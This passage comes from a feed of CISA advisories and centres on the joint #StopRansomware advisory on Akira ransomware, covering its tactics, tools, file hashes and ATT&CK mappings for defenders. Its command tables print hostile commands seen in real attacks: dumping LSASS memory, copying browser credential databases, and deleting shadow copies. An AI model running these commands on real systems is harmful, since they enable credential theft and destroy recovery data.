<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>FBI, CISA, and HHS do not encourage paying ransom as payment does not guarantee victim files will be&nbsp;recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center\">Internet Crime Complain Center (IC3)</a>, a local FBI <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA [1-844-729-2472]).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. FBI, CISA, HHS, and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, HHS, and MS-ISAC.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p><strong>May 10, 2024:</strong> Initial version.</p>
</div>
") (pubDate nil "Fri, 10 May 2024 09:02:21 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21435")) (item nil (title nil "#StopRansomware: Akira Ransomware") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a") (description nil "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note: </strong>This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The United States’ Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security Centre (NCSC-NL)&nbsp;are releasing this joint CSA to disseminate known Akira ransomware&nbsp;IOCs and TTPs identified through FBI investigations and trusted third party reporting as recently as February 2024.</p>
<p>Since March 2023, Akira ransomware has impacted a wide range of businesses and critical infrastructure entities in North America, Europe, and Australia. In April 2023, following an initial focus on Windows systems,&nbsp;Akira threat actors deployed a Linux variant targeting VMware ESXi virtual machines. As of January 1, 2024, the ransomware group has impacted over 250 organizations and claimed approximately $42 million (USD) in ransomware proceeds.</p>
<p>Early versions of the Akira&nbsp;ransomware variant were written in C++ and encrypted files with a&nbsp;<code>.akira</code> extension; however, beginning in August 2023, some Akira attacks began deploying Megazord, using Rust-based code which encrypts files with a&nbsp;<code>.powerranges</code> extension.&nbsp;&nbsp;Akira threat actors have continued to use both Megazord and Akira, including Akira_v2 (identified by trusted third party investigations) interchangeably.</p>
<p>The FBI, CISA, EC3, and NCSC-NL encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/aa24-109a-stopransomware-akira-ransomware_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-109A #StopRansomware: Akira Ransomware</a>
    <span class=\"c-file__size\">(PDF,       591.05 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A.stix_0.xml\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX XML</a>
    <span class=\"c-file__size\">(XML,       114.01 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A-StopRansomware-Akira-Ransomware.stix_0.json\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       67.80 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the MITRE ATT&amp;CK® for Enterprise framework, version 14. See <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> for all referenced tactics and techniques.</p>
<h4><strong>Initial Access</strong></h4>
<p>The FBI and cybersecurity researchers have observed Akira threat actors obtaining initial access to organizations through a virtual private network (VPN) service without multifactor authentication (MFA) configured[<a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">1</a>], mostly using known Cisco vulnerabilities [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-3259\" title=\"CVE-2020-3259\">CVE-2020-3259</a> and&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-20269\" title=\"CVE-2023-20269\">CVE-2023-20269</a>.[<a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">2</a>],[<a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">3</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] Additional methods of initial access include the use of external-facing services such as Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a>],&nbsp;spear phishing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a>][<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a>], and the abuse of valid credentials[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>]</p>
<h4><strong>Persistence and Discovery</strong></h4>
<p>Once initial access is obtained, Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a>] to establish persistence. In some instances, the FBI identified Akira threat actors creating an administrative account named <code>itadm</code>.</p>
<p>According to FBI and open source reporting, Akira threat actors leverage post-exploitation attack techniques, such as Kerberoasting[<a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">5</a>], to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]<a>.</a>[<a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">6</a>] Akira threat actors also use credential scraping tools [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] like&nbsp;Mimikatz and&nbsp;LaZagne&nbsp;to aid in privilege escalation. Tools like SoftPerfect and Advanced IP Scanner are often used for network device discovery (reconnaissance) purposes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a>] and <code>net</code> Windows commands are used to identify domain controllers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and gather information on domain trust relationships [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>].</p>
<p>See Table 1 for a descriptive listing of these tools.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>Based on trusted third party investigations, Akira threat actors have been observed deploying two distinct ransomware variants against different system architectures within the same compromise event. This marks a shift from recently reported Akira ransomware activity. Akira threat actors were first observed deploying the Windows-specific “Megazord” ransomware, with further analysis revealing that a second payload was concurrently deployed in this attack (which was later identified as a novel variant of the Akira ESXi encryptor, “Akira_v2”).</p>
<p>As Akira threat actors prepare for lateral movement, they commonly disable security software to avoid detection. Cybersecurity researchers have observed Akira threat actors using PowerTool to exploit the Zemana AntiMalware driver[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] and terminate antivirus-related processes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h4><strong>Exfiltration and Impact</strong></h4>
<p>Akira&nbsp;threat actors leverage tools such as&nbsp;FileZilla, WinRAR [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>], WinSCP, and&nbsp;RClone to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]. To establish command and control channels, threat actors leverage readily available tools like AnyDesk, MobaXterm, RustDesk,&nbsp;Ngrok, and Cloudflare Tunnel, enabling exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a>] to connect to exfiltration servers.</p>
<p>Akira threat actors use a double-extortion model [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a>] and encrypt systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>] after exfiltrating data. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via <code>a&nbsp;.onion</code> URL.&nbsp;Akira threat actors do not leave an initial ransom demand or payment instructions on compromised networks, and do not relay this information until contacted by the victim.&nbsp;Ransom payments are paid in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. To further apply pressure, Akira threat actors threaten to publish exfiltrated data on the Tor network, and in some instances have called victimized companies, according to FBI reporting.</p>
<h4><strong>Encryption</strong></h4>
<p>Akira threat actors utilize a sophisticated hybrid encryption scheme to lock data. This involves combining a ChaCha20&nbsp;stream cipher with an RSA public-key cryptosystem for speed and secure key exchange [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. This multilayered approach tailors encryption methods based on file type and size and is capable of full or partial encryption.&nbsp;Encrypted files are appended with either a <code>.akira</code> or&nbsp;<code>.powerranges</code> extension. To further inhibit system recovery, Akira’s encryptor (<code>w.exe</code>) utilizes&nbsp;PowerShell commands to delete volume shadow copies (VSS) on Windows systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a>]. Additionally, a ransom note named&nbsp;<code>fn.txt</code> appears in both the root directory (<code>C:</code>) and each users’ home directory (<code>C:\\Users</code>).</p>
<p>Trusted third party analysis identified that the Akira_v2 encryptor is an upgrade from its previous version, which includes additional functionalities due to the language it’s written in (Rust). Previous versions of the encryptor provided options to insert arguments at runtime, including:</p>
<ul>
<li><code>-p --encryption_path (targeted file/folder paths)</code></li>
<li><code>-s --share_file (targeted network drive path)</code></li>
<li><code>-n --encryption_percent (percentage of encryption)</code></li>
<li><code>--fork (create a child process for encryption</code></li>
</ul>
<p>The ability to insert additional threads allows Akira threat actors to have more granular control over the number of CPU cores in use, increasing the speed and efficiency of the encryption process. The new version also adds a layer of protection, utilizing the Build ID as a run condition to hinder dynamic analysis. The encryptor is unable to execute successfully without the unique Build ID. The ability to deploy against only virtual machines using “<code>vmonly</code>” and the ability to stop running virtual machines with “<code>stopvm</code>” functionalities have also been observed implemented for Akira_v2. After encryption, the Linux ESXi variant may include the file extension “<code>akiranew</code>” or add a ransom note named “<code>akiranew.txt</code>” in directories where files were encrypted with the new nomenclature.</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>Table 1 lists publicly available tools and applications Akira threat actors have used, including legitimate tools repurposed for their operations. Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Leveraged by Akira Ransomware Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0552/\" title=\"AdFind\">AdFind</a></td>
<td><code>AdFind.exe</code> is used to query and retrieve information from Active Directory.</td>
</tr>
<tr>
<td>Advanced IP Scanner</td>
<td>A network scanner is used to locate all the computers on a network and conduct a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin).</td>
</tr>
<tr>
<td>AnyDesk</td>
<td>A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a>]. AnyDesk also supports remote file transfer.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S0349\" title=\"LaZagne\">LaZagne</a></td>
<td>Allows users to recover stored passwords on Windows, Linux, and OSX systems.</td>
</tr>
<tr>
<td>PCHunter64</td>
<td>A tool used to acquire detailed process and system information<a>&nbsp;[</a><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].[<a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">7</a>]</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">PowerShell</a></td>
<td>A cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0002/\" title=\"Mimikatz\">Mimikatz</a></td>
<td>Allows users to view and save authentication credentials such as Kerberos tickets.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0508/\" title=\"ngrok\">Ngrok</a></td>
<td>A reverse proxy tool [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a>] used to create a secure tunnel to servers behind firewalls or local machines without a public IP address.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S1040\" title=\"Rclone\">RClone</a></td>
<td>A command line program used to sync files with cloud storage services [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>] such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.</td>
</tr>
<tr>
<td>WinRAR</td>
<td>Used to split compromised data into segments and to compress [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>] files into&nbsp;<code>.RAR</code> format for exfiltration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Akira&nbsp;threat actors have used it to transfer data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>] from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h4><strong>Indicators of Compromise</strong></h4>
<p><strong>Disclaimer:</strong> Investigation or vetting of these indicators is recommended prior to taking action, such as blocking.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2a: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (SHA-256)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>w.exe</td>
<td>d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca</td>
<td>Akira ransomware</td>
</tr>
<tr>
<td>Win.exe</td>
<td>dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e</td>
<td>Akira ransomware encryptor</td>
</tr>
<tr>
<td>AnyDesk.exe</td>
<td>bc747e3bf7b6e02c09f3d18bdd0e64eef62b940b2f16c9c72e647eec85cf0138</td>
<td>Remote desktop application</td>
</tr>
<tr>
<td>Gcapi.dll</td>
<td>73170761d6776c0debacfbbc61b6988cb8270a20174bf5c049768a264bb8ffaf</td>
<td>DLL file that assists with the execution of AnyDesk.exe</td>
</tr>
<tr>
<td>Sysmon.exe</td>
<td>1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386</td>
<td>Ngrok tool for persistence</td>
</tr>
<tr>
<td>Config.yml</td>
<td>Varies by use</td>
<td>Ngrok configuration file</td>
</tr>
<tr>
<td>Rclone.exe</td>
<td>aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9</td>
<td>Exfiltration tool</td>
</tr>
<tr>
<td>Winscp.rnd</td>
<td>7d6959bb7a9482e1caa83b16ee01103d982d47c70c72fdd03708e2b7f4c552c4</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>WinSCP-6.1.2-Setup.exe</td>
<td>36cc31f0ab65b745f25c7e785df9e72d1c8919d35a1d7bd4ce8050c8c068b13c</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>Akira_v2</td>
<td>
<p>3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75</p>
<p>0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c</p>
</td>
<td>Akira_v2 ransomware</td>
</tr>
<tr>
<td>Megazord</td>
<td>
<p>ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc</p>
<p>dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198</p>
<p>131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07</p>
<p>9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c</p>
<p>9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065</p>
<p>2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83</p>
<p>7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be</p>
<p>95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a</p>
<p>0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d</p>
<p>C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0</p>
</td>
<td>Akira “Megazord” ransomware</td>
</tr>
<tr>
<td>VeeamHax.exe</td>
<td>aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d</td>
<td>Plaintext credential leaking tool</td>
</tr>
<tr>
<td>Veeam-Get-Creds.ps1</td>
<td>18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88</td>
<td>PowerShell script for obtaining and decrypting accounts from Veeam servers</td>
</tr>
<tr>
<td>PowershellKerberos TicketDumper</td>
<td>5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32</td>
<td>Kerberos ticket dumping tool from LSA cache</td>
</tr>
<tr>
<td>sshd.exe</td>
<td>8317ff6416af8ab6eb35df3529689671a700fdb61a5e6436f4d6ea8ee002d694</td>
<td>OpenSSH Backdoor</td>
</tr>
<tr>
<td>ipscan-3.9.1-setup.exe</td>
<td>892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0</td>
<td>Network scanner that scans IP addresses and ports</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2b: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (MD5)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>winrar-x64-623.exe</td>
<td>7a647af3c112ad805296a22b2a276e7c</td>
<td>Network file transfer program</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:&nbsp;</strong>While the date/time can be changed by Akira threat actors, trusted third-party analysis confirmed these samples were created on December 28, 2023.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Windows Akira Ransomware Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43</td>
</tr>
<tr>
<td>0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f</td>
</tr>
<tr>
<td>a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc</td>
</tr>
<tr>
<td>03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45</td>
</tr>
<tr>
<td>2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422</td>
</tr>
<tr>
<td>40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5</td>
</tr>
<tr>
<td>5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2</td>
</tr>
<tr>
<td>643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562</td>
</tr>
<tr>
<td>6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84</td>
</tr>
<tr>
<td>fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f</td>
</tr>
<tr>
<td>74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1</td>
</tr>
<tr>
<td>3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5a: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Persistence and Discovery</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>nltest /dclist: [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>]</td>
</tr>
<tr>
<td>nltest /DOMAIN_TRUSTS [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>]</td>
</tr>
<tr>
<td>net group “Domain admins” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>]</td>
</tr>
<tr>
<td>net localgroup “Administrators” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a>]</td>
</tr>
<tr>
<td>tasklist [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a>]</td>
</tr>
<tr>
<td>rundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5b: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Credential Access</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Firefox data.</p>
</td>
</tr>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Google Chrome data.</p>
</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5c: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Impact</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>]</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 6 -14 for all referenced Akira threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>Akira threat actors obtain and abuse credentials of existing accounts as a means of gaining initial access.</td>
</tr>
<tr>
<td>Exploit Public Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Akira threat actors have used remote access services, such as RDP/VPN connection to gain initial access.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Attachment&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a></td>
<td>Akira threat actors use phishing emails with malicious attachments to gain access to networks.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Link&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a></td>
<td>Akira threat actors use phishing emails with malicious links to gain access to networks.&nbsp;</td>
</tr>
</tbody>
</table>
